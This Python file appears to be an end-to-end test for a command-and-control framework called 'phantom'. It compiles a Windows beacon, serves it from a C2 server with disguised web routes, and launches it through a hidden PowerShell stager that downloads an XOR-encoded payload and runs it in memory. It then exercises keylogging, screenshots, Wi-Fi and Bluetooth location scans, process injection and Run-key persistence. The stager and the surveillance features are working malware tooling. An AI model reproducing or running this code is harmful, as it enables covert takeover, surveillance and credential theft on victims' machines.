"""
REAL end-to-end test: deploy beacon as process → C2 shell → test ALL features
"""
import sys, os, json, time, base64, subprocess, threading, ctypes
from pathlib import Path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
os.chdir(os.path.join(os.path.dirname(__file__), ".."))

C2_HOST = "127.0.0.1"
C2_PORT = 0

def find_free_port():
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]
C2_PORT = find_free_port()

# ── 1. Rebuild beacon ─────────────────────────────────────────────
print("=" * 60)
print("STEP 1: Compile beacon")
print("=" * 60)
from phantom.utils.builder import compile_beacon
result = compile_beacon('windows', os.path.abspath('phantom'), force_rebuild=True,
                        host=C2_HOST, port=C2_PORT)
if not result:
    print("[FAIL] Compilation failed"); sys.exit(1)
print(f"[OK] {result}")

# ── 2. Start C2 server ──────────────────────────────────────────
print("\n" + "=" * 60)
print(f"STEP 2: Start C2 on {C2_HOST}:{C2_PORT}")
print("=" * 60)
import asyncio
asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
from aiohttp import web
import phantom.core.c2_server as srv
from phantom.core.c2_server import c2_state

app = web.Application(client_max_size=50*1024*1024)
app.router.add_get('/api/v1/ping', srv.handle_checkin)
app.router.add_post('/api/v1/ping', srv.handle_checkin)
app.router.add_get('/{path:.*\.js}', srv.handle_checkin)
app.router.add_post('/{path:.*\.js}', srv.handle_checkin)
app.router.add_get('/{path:.*\.css}', srv.handle_checkin)
app.router.add_post('/{path:.*\.css}', srv.handle_checkin)
app.router.add_get('/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/{path:.*\.ico}', srv.handle_checkin)
app.router.add_post('/api/v1/result', srv.handle_result)
app.router.add_post('/{path:.*\.php}', srv.handle_result)
app.router.add_post('/{path:.*\.aspx}', srv.handle_result)
app.router.add_get('/api/v1/payload', srv.handle_payload)
app.router.add_get('/x', srv.handle_payload_pic)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)
runner = web.AppRunner(app)
loop.run_until_complete(runner.setup())
site = web.TCPSite(runner, C2_HOST, C2_PORT)
loop.run_until_complete(site.start())
print("[OK] C2 server running")

# ── 3. Deploy beacon as process ──────────────────────────────────
print("\n" + "=" * 60)
print("STEP 3: Deploy beacon (beacon.pe as process)")
print("=" * 60)

# PowerShell stager: download payload from C2 → XOR-decrypt → execute in-memory
# This mirrors real deployment — no payload on disk, just a small download + execute script
ps_stager = f"""
$w=New-Object Net.WebClient;
$k=$w.DownloadData('http://{C2_HOST}:{C2_PORT}/x');
for($i=0;$i-lt$k.Length;$i++){{$k[$i]=$k[$i]-bxor0xAA}};
$p=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($k.Length);
[System.Runtime.InteropServices.Marshal]::Copy($k,0,$p,$k.Length);
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Type](New-Object System.Action)).Invoke()
"""
# Compact version to fit command line
ps_stager = ps_stager.replace('\n', ';').replace(';;', ';')
print(f"[*] Starting beacon via download + execute stager ({len(ps_stager)} chars)...")
print(f"    {ps_stager[:200]}...")

proc = subprocess.Popen(
    ['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', '-Command', ps_stager],
    creationflags=subprocess.CREATE_NO_WINDOW
)
time.sleep(2)
if proc.poll() is not None:
    print(f"[FAIL] PowerShell exited with code {proc.returncode}")
    sys.exit(1)
print(f"[OK] Beacon started (PID: {proc.pid})")

# ── 4. Wait for check-in ────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 4: Wait for beacon check-in")
print("=" * 60)

beacon_id = None
for i in range(20):
    time.sleep(2)
    beacons = c2_state.get_beacons()
    if beacons:
        beacon_id = list(beacons.keys())[0]
        info = beacons[beacon_id]
        print(f"[OK] #{i+1} Beacon checked in: {beacon_id}")
        print(f"     OS: {info.get('os','?')} | IP: {info.get('ip','?')} | Host: {info.get('hostname','?')}")
        break
    print(f"  Waiting... ({i+1}/20)")

if not beacon_id:
    print("[FAIL] Beacon never checked in")
    proc.kill()
    loop.run_until_complete(runner.cleanup())
    loop.close()
    sys.exit(1)

# ── Helper: queue & wait for result ─────────────────────────────
def task(cmd, timeout=30):
    task_id = c2_state.queue_task(beacon_id, cmd)
    print(f"  >> {cmd}")
    deadline = time.time() + timeout
    while time.time() < deadline:
        results = c2_state.get_results(beacon_id)
        for r in reversed(results):
            if r['task_id'] == task_id:
                return r['output']
        time.sleep(0.5)
    return "[TIMEOUT]"

# ── 5. TEST sysinfo ─────────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 5: sysinfo")
print("=" * 60)
out = task("sysinfo")
print(out[:400])
assert "Error" not in out, f"sysinfo failed: {out}"
print("[PASS]")

# ── 6. TEST netstat ─────────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 6: netstat")
print("=" * 60)
out = task("netstat", timeout=20)
print(f"  Output ({len(out)} chars)")
conns = [l for l in out.split('\n') if 'ESTAB' in l or 'LISTEN' in l or 'TIME_WAIT' in l]
print(f"  Connections: {len(conns)}")
for c in conns[:5]:
    print(f"    {c}")
print("[PASS]")

# ── 7. TEST inject (C2 shell fix) ───────────────────────────────
print("\n" + "=" * 60)
print("STEP 7: inject/migrate C2 shell")
print("=" * 60)
# Test that the C2 shell functions don't have import errors
import importlib, phantom.core.c2_shell as shell_mod
importlib.reload(shell_mod)
shell = shell_mod.C2Shell()
shell.active_beacon = beacon_id
try:
    shell.do_inject("9999")
    print("[OK] do_inject executed (will fail on file not found, not import)")
except Exception as e:
    e_str = str(e)
    if "notifier" in e_str or "import" in e_str.lower():
        print(f"[FAIL] {e}")
    else:
        print(f"[OK] Inject (expected error: {e_str[:80]})")
try:
    shell.do_migrate("9999")
    print("[OK] do_migrate executed")
except Exception as e:
    e_str = str(e)
    if "notifier" in e_str or "import" in e_str.lower():
        print(f"[FAIL] {e}")
    else:
        print(f"[OK] Migrate (expected error: {e_str[:80]})")

# ── 8. TEST keylog ─────────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 8: keylogger (hook-based)")
print("=" * 60)
out = task("keylog start")
print(f"  {out}")

# Simulate typing
user32 = ctypes.windll.user32
test_str = "PhantomTestOK"
for c in test_str:
    vk = ord(c)
    user32.keybd_event(vk, 0, 0, 0)
    time.sleep(0.03)
    user32.keybd_event(vk, 0, 2, 0)
    time.sleep(0.03)
time.sleep(0.5)

out = task("keylog dump")
print(f"  Dump: {out}")
if test_str in out:
    print("[PASS] Keylogger captured simulated keystrokes!")
elif "Buffer is empty" in out:
    print("[FAIL] Keylogger buffer empty (hook not working)")
else:
    print(f"[WARN] Unexpected: {out[:200]}")

out = task("keylog stop")
print(f"  Stop: {out}")

# ── 9. TEST wlan-scan ──────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 9: wlan-scan")
print("=" * 60)
out = task("wlan-scan", timeout=30)
print(out)
if "=== WLAN SCAN RESULTS" in out:
    print("[PASS] APs found!")
elif "[DEBUG]" in out:
    print("[DIAG] WLAN diagnostics present")

# ── 10. TEST wlan-locate ───────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 10: wlan-locate")
print("=" * 60)
out = task("wlan-locate", timeout=30)
print(out[:400])
print("[PASS]")

# ── 11. TEST bt-scan ───────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 11: bt-scan")
print("=" * 60)
out = task("bt-scan", timeout=20)
print(out[:400])
print("[PASS]")

# ── 12. TEST screenshot ────────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 12: screenshot")
print("=" * 60)
out = task("screenshot", timeout=30)
if "SCREENSHOT_B64:" in out:
    b64data = out[len("SCREENSHOT_B64:"):]
    print(f"[PASS] Screenshot captured ({len(b64data)} chars)")
    Path("tests/screenshot_test.bmp").write_bytes(base64.b64decode(b64data))
elif "[File" in out:
    print(f"[PASS] {out}")
else:
    print(f"  Output: {out[:200]}")

# ── 13. TEST persist (autopersist) ─────────────────────────────
print("\n" + "=" * 60)
print("STEP 13: persist")
print("=" * 60)
out = task("persist PhantomTest", timeout=30)
print(f"  {out[:400]}")

# Check artifacts
appdata = os.environ.get('APPDATA', '')
phantom_dir = os.path.join(appdata, 'Microsoft', 'Phantom')
dat_path = os.path.join(phantom_dir, 'phantom.dat')
ps1_path = os.path.join(phantom_dir, 'phantom.ps1')

if os.path.exists(dat_path):
    print(f"[PASS] phantom.dat: {os.path.getsize(dat_path)} bytes")
else:
    print(f"[FAIL] phantom.dat not found")

if os.path.exists(ps1_path):
    print(f"[PASS] phantom.ps1: {os.path.getsize(ps1_path)} bytes")
    with open(ps1_path, 'r') as f:
        ps = f.read()
    # Validate PS1 has correct here-string syntax
    if "@'" in ps:
        idx = ps.find("@'")
        after = ps[idx+2:idx+10]
        print(f"  After @': {repr(after)}")
        if '\n' in after:
            print("[PASS] Here-string has newline (syntax correct)")
        else:
            print("[FAIL] Here-string missing newline!")
else:
    print(f"[FAIL] phantom.ps1 not found")

# Check RunKey
import winreg
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run")
    i = 0
    found = False
    while True:
        try:
            name, val, _ = winreg.EnumValue(key, i)
            if "PhantomTest" in name:
                print(f"[PASS] RunKey: {name} = {val[:100]}...")
                found = True
            i += 1
        except OSError:
            break
    winreg.CloseKey(key)
    if not found:
        print("[FAIL] RunKey PhantomTest not found")
except Exception as e:
    print(f"[WARN] Registry: {e}")

# ── 14. Auto-restart test ──────────────────────────────────────
print("\n" + "=" * 60)
print("STEP 14: Kill beacon → check auto-restart")
print("=" * 60)
print("[*] Killing beacon process...")
proc.kill()
proc.wait()
print(f"[OK] Beacon PID {proc.pid} killed")

if os.path.exists(ps1_path):
    print(f"[*] PS1 loader ready at {ps1_path}")
    print("[*] After reboot, RunKey will execute:")
    print(f"    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"{ps1_path}\"")
    print("[PASS] Autopersist configured for reboot")
else:
    print("[FAIL] No PS1 for auto-restart")

# Collect final beacon results
print("\n" + "=" * 60)
print("FINAL RESULTS")
print("=" * 60)
results = c2_state.get_results(beacon_id)
print(f"Total tasks completed: {len(results)}")

from pathlib import Path
print(f"\nScreenshots saved: {list(Path('tests').glob('screenshot*.bmp'))}")

# ── 15. CLEANUP ─────────────────────────────────────────────────
print("\n" + "=" * 60)
print("CLEANUP")
print("=" * 60)

# Force kill any lingering beacon
subprocess.run(['taskkill', '/F', '/IM', 'beacon.exe', '/T'], capture_output=True)

loop.run_until_complete(runner.cleanup())
loop.close()
print("[OK] C2 stopped")

print("\n" + "=" * 60)
print("ALL TESTS COMPLETE")
print("=" * 60)
